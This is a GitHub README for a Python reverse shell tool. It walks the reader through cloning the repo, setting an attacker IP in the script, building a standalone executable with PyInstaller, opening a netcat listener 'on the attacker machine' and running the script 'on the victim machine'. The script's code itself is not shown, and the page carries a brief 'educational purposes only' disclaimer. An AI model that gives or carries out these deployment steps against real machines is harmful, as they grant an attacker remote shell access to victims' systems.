# ReverseShell | Written In <a href="https://www.python.org/"><img src="https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54" alt="Python Badge"/></a>
- A python3 reverseshell.

![revsh](https://raw.githubusercontent.com/Keyj33k/profiles/main/profile/backd_profile.jpeg)

## How to use this reverseshell?:snake:

- 1 ) Clone the repo:
```
git clone https://github.com/Keyj33k/ReverseShell.git
```
- 2 ) Now you need to navigate to the ReverseShell directory.
```
cd ReverseShell
```
- You will find a file called >> reverseshell.py:

### You need to change the ipv4 address in the script:
---
![exa](https://github.com/Keyj33k/profiles/blob/main/profile/revshell.png?raw=true)
---
- 3 ) This Reverse Shell needs requirements you need to install:
```
pip install -r requirements.txt
```
- 4 ) Build an executable using this command:
```
pyinstaller --onefile reverseshell.py
```
- PyInstaller command not found?
```
pip install pyinstaller
```
### If the steps above are done:

- On the attacker machine:
```
nc -lnvp 5003
```
- NC command not found (Debian/-based)?
```
sudo apt-get install -y netcat
```

- On the victim machine:
```
python3 reverseshell.py 
```
# Explained:

![listener](https://raw.githubusercontent.com/Keyj33k/profiles/main/profile/reverseshell.jpeg)

Note:
- This tool is for educational and ethical purposes only. 
- I'm not responsible for your actions. 
- Don't hack anyone without their permissions.
- With great force follows great responsibility.

---
![pypy](https://raw.githubusercontent.com/Keyj33k/profiles/main/profile/pypy.jpeg)
---
---
  
- Tested on 5.17.0-kali3-amd64, 5.15.0-40-generic-Ubuntu
  
---


